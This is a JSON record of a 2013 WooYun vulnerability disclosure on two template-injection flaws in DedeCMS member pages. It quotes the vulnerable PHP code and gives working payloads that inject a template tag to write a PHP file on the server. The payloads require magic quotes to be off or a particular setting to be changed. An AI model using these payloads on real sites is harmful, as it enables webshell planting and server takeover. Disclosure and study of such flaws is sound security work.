{"id": 14652, "wybug_id": "wooyun-2013-018564", "wybug_title": "dedecms鸡肋getshell", "wybug_corp": "dedecms", "wybug_author": "yy520", "wybug_date": "2013-02-10 11:11", "wybug_open_date": "2013-02-10 11:11", "wybug_type": "命令执行", "wybug_level": "低", "wybug_rank_0": "1", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码审核"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-02-10：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2013-02-10：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 一枚gpc off的getshell，一枚管理员修改了某个配置的getshell，唉，都是鸡肋新年快乐 详细说明：  gpc off 的getshell\n/member/soft_add.php 156      if($softurl1!='') 157      { 158          $urls .= \"{dede:link islocal='1' text='{$servermsg1}'} $softurl1 {/dede:link}\\r\\n\"; 159      }\n其中的$servermsg1毫无过滤的进入了$url中构造好$servermsg1='}x{/dede:link}{dede:yy520 name\\=\"']=0;fputs(fopen('2.php','w'),'justforfun');//\"}yy520{/dede:yy520}在plus 底下就可以生成一个2.php当$cfg_mb_rmdown 为N的时候的getshellmember/album_add.php\n92      if($formhtml==1)  93      {  94          $imagebody = stripslashes($imagebody); //无视gpc了  95          $imgurls .= GetCurContentAlbum($imagebody,$copysource,$litpicname);  96          if($ddisfirst==1 && $litpic=='' && !empty($litpicname))  97          {  98              $litpic = $litpicname;  99              $hasone = true; 100          } 101      } 102      $info = '';进入到GetCurContentAlbumfunction GetCurContentAlbum($body,$rfurl,&$firstdd)  28  {  29      global $cfg_multi_site,$cfg_basehost,$ddmaxwidth,$cfg_basedir,$pagestyle,$cfg_mb_rmdown,$title,$cfg_ml,$cfg_user_dir;  30      include_once (DEDEINC.\"/dedecollection.func.php\");  31      if(empty($ddmaxwidth)) $ddmaxwidth = 240;  32      $rsimg = '';  33      $basehost = \"http://\".$_SERVER[\"HTTP_HOST\"];  34      $img_array = array();  35      preg_match_all(\"/(src|SRC)=[\\\"|'| ]{0,}(http:\\/\\/([^>]*)\\.(gif|jpg|png))/isU\", $body, $img_array);  36      $img_array = array_unique($img_array[2]);  37      $imgUrl = $cfg_user_dir.\"/\".$cfg_ml->M_ID;  38      $imgPath = $cfg_basedir.$imgUrl;  39      if(!is_dir($imgPath.\"/\"))  40      {  41          MkdirAll($imgPath,$GLOBALS['cfg_dir_purview']);  42          CloseFtp();  43      }  44      $milliSecond = MyDate(\"ymdHis\",time());  45      foreach($img_array as $key => $value)  46      {  47          if(preg_match(\"#\".$basehost.\"#i\", $value))  48          {  49              continue;  50          }  51          if($cfg_basehost!=$basehost && preg_match(\"#\".$cfg_basehost.\"#i\", $value))  52          {  53              continue;  54          }  55          if(!preg_match(\"#^http:\\/\\/#i\", $value))  56          {  57              continue;  58          }  59          if($cfg_mb_rmdown=='Y')　　｛...........｝　　  93          else  94          {  95              $rsimg .= \"{dede:img ddimg='$value' text='' width='0' height='0'} $value {/dede:img}\\r\\n\";  96          }  97      }  98      return $rsimg;  99  }\n构造formhtml为1imagabody为src=http://{/dede:img}{dede:yy520 name\\=\"']=0;fputs(fopen('2.php','w'),'justforfun');//\"}yy520{/dede:yy520}.jpg   漏洞证明：  本地测试均成功....   修复方案：     版权声明：转载请注明来源 yy520@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n     2013-02-10 12:28 |    \t\t_Evil \t\t\t( 普通白帽子  |\t\t\t        Rank:418 漏洞数:59        | 万事无他,唯手熟尔。农民也会编程,别指望天...)\t\t \n  大哥是黑客    \n     2013-02-13 16:22 |    \t\t鬼哥 \t\t\t( 普通白帽子  |\t\t\t        Rank:136 漏洞数:13        | 鬼哥 ！！！！)\t\t \n  成功不了吧。。求细节。。。    \n     2013-02-13 18:01 |    \t\t鬼哥 \t\t\t( 普通白帽子  |\t\t\t        Rank:136 漏洞数:13        | 鬼哥 ！！！！)\t\t \n  我错了。。没搞清楚环境。。刚测试了OK了。。确实很鸡肋    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}